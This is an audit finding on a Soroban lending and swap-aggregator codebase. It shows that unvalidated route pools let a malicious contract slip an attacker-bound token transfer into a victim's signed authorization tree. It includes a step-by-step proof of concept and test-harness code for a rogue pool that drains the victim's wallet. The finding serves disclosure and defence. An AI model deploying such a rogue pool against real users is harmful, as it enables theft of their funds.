### Title
Unvalidated route venues can inject arbitrary user-authorized token transfers into lending swaps - ([File: contracts/swap-aggregator/src/execute/mod.rs](contracts/swap-aggregator/src/execute/mod.rs)) [1](#0-0) 

### Summary
The swap router executes caller-supplied `StrategyPayload` routes whose address registry supplies the pool contract for each hop, and the venue adapters invoke those addresses without a pool allowlist. [2](#0-1) [3](#0-2)  A malicious pool reached through `multiply`, `swap_debt`, `swap_collateral`, or `repay_debt_with_collateral` can therefore place an unrelated `token.transfer(victim, attacker, amount)` inside the authorization tree that simulation asks the victim to sign. [4](#0-3) 

### Finding Description
`execute_strategy` requires `sender.require_auth()`, decodes the payload’s `assets` registry and packed ops, and pulls only the declared input token. [5](#0-4)  Each swap op then resolves its pool from that payload-controlled registry and dispatches it to a venue adapter. [3](#0-2)  For example, the Aquarius adapter calls payload-selected `hop.pool` addresses through `get_tokens` and `swap`, while authorizing only the router’s input-token transfer to that pool. [6](#0-5)  The controller likewise constrains only its own `token_in.transfer(controller, router, amount_in)` authorization and measures router input/output balances; it does not constrain unrelated sub-invocations that require the original account owner’s authorization. [7](#0-6)  The repository’s own adversarial harness demonstrates that a rogue hop’s transfer from the caller to an attacker is recorded under the caller’s `swap_collateral` authorization and executes when that poisoned tree is signed. [8](#0-7) 

### Impact Explanation
This is theft of user funds beyond the routed input: the malicious venue can transfer any token balance for which the victim’s authorization is available, while still returning enough output to satisfy route and lending-account checks. [9](#0-8)  The documented threat model confirms that this loss is the caller’s wallet rather than merely the routed amount and that neither the payload minimum nor the final account risk gate bounds it. [10](#0-9) 

### Likelihood Explanation
Any unprivileged user can deploy a venue-compatible contract and construct route bytes naming it, because the venue enum constrains the ABI but not the pool address. [11](#0-10) [12](#0-11)  Successful exploitation requires the victim or their client to sign the simulated authorization tree containing the unexpected token transfer, which is realistic when clients surface only the top-level strategy call or rely on simulation-produced auth without validating every child invocation. [13](#0-12)  The affected lending entrypoints are normal owner/delegate strategy calls, including `swap_collateral`, which passes caller-controlled `swap` bytes into the router path. [14](#0-13) 

### Recommendation
Bind each route hop to a governance-approved venue/pool registry rather than accepting arbitrary pool addresses, or otherwise ensure that venue calls cannot appear under user signatures unless they are explicitly trusted. [11](#0-10)  Clients and SDKs must also decode the complete signed authorization tree and reject any child invocation other than the expected token transfers for the route. [10](#0-9) 

### Proof of Concept
1. Attacker deploys a contract implementing the Aquarius metadata and `swap` ABI used by the router; its `get_tokens` returns the route’s input and output tokens, and its `swap` calls `token::transfer(victim, attacker, unrelated_balance)` before paying a valid output. [12](#0-11) [15](#0-14) 
2. The attacker supplies a `StrategyPayload` whose `assets` registry contains this pool and whose op is an Aquarius swap from the victim’s current collateral token to the requested collateral token. [2](#0-1) 
3. The victim calls `controller.swap_collateral(caller=victim, account_id, current, amount, new, swap=poisoned_route)`; the controller withdraws collateral, invokes the configured router, and measures a valid output. [14](#0-13) [16](#0-15) 
4. Simulation records the rogue transfer as a child of the victim’s controller authorization, and signing that tree causes the unrelated wallet token to be transferred to the attacker while the swap itself succeeds. [9](#0-8) [8](#0-7)

### Citations

**File:** contracts/swap-aggregator/src/execute/mod.rs (L51-85)
```rust
pub(crate) fn run(env: Env, sender: Address, total_in: i128, payload: StrategyPayload) -> i128 {
    sender.require_auth();

    if total_in <= 0 {
        panic_with_error!(&env, Error::InvalidAmount);
    }

    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
    let total_min_out = amounts.get_unchecked(program.min_out);
    if total_min_out <= 0 {
        panic_with_error!(&env, Error::SlippageExceeded);
    }

    let router = env.current_contract_address();
    let mut vault = Vault::new(&env);
    let mut tokens_cache: Map<Address, Vec<Address>> = Map::new(&env);

    // Credit the measured delta, not declared `total_in`: a fee-on-transfer
    // input would otherwise draw the shortfall from the fee reserve.
    let credited_in = transfer_amount_measured(
        &env,
        &input_token,
        &sender,
        &router,
        total_in,
        GenericError::AmountMustBePositive,
    );
```

**File:** contracts/swap-aggregator/README.md (L19-26)
```markdown
`swap_xdr` → `StrategyPayload` with three fields: `amounts` (the amount
registry — `total_min_out`, fixed inputs, burn floors, mint min-shares),
`assets` (the address registry — tokens, pools, LP share tokens), and `ops`
(the packed instruction stream: a 10-byte header carrying the version,
`token_in`, `token_out`, `min_out`, `referral_id` and the instruction and weight
counts, then one 5-byte record per instruction, then the u24 split weights).
Instructions reference the two registries by `u8` index. The byte layout lives
in `src/program.rs`.
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L23-40)
```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L62-70)
```rust
    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-268)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L16-34)
```rust
pub(super) fn invoke_pool_swap(
    env: &Env,
    router: &Address,
    pool: &Address,
    token_in: &Address,
    in_idx: u32,
    out_idx: u32,
    amount_in: i128,
) {
    authorize_token_transfer(env, token_in, router, pool, amount_in);
    let args: Vec<Val> = vec![
        env,
        router.into_val(env),
        in_idx.into_val(env),
        out_idx.into_val(env),
        to_u128(env, amount_in).into_val(env),
        0_u128.into_val(env),
    ];
    let _: u128 = env.invoke_contract(pool, &symbol_short!("swap"), args);
```

**File:** contracts/swap-aggregator/src/venues/aquarius/pool.rs (L37-48)
```rust
/// Returns the pool's constituent tokens, cached per invocation in `cache`.
/// Panics with `BrokenTokenChain` on an empty, oversized, or duplicate list.
pub(super) fn pool_tokens(
    env: &Env,
    cache: &mut Map<Address, Vec<Address>>,
    pool: &Address,
) -> Vec<Address> {
    if let Some(tokens) = cache.get(pool.clone()) {
        return tokens;
    }
    let tokens: Vec<Address> =
        env.invoke_contract(pool, &Symbol::new(env, "get_tokens"), Vec::<Val>::new(env));
```

**File:** contracts/controller/src/strategies/swap.rs (L29-55)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });

    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
}
```

**File:** docs/explanation/threat-model.md (L154-164)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L55-76)
```rust
    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
    );

    let deposit_assets = vec![env, (new.clone(), swapped_amount)];
    supply::process_deposit(
        env,
        &env.current_contract_address(),
        &mut account,
        &deposit_assets,
        &mut cache,
    );

    strategy_finalize(env, account_id, &mut account, &mut cache);
```
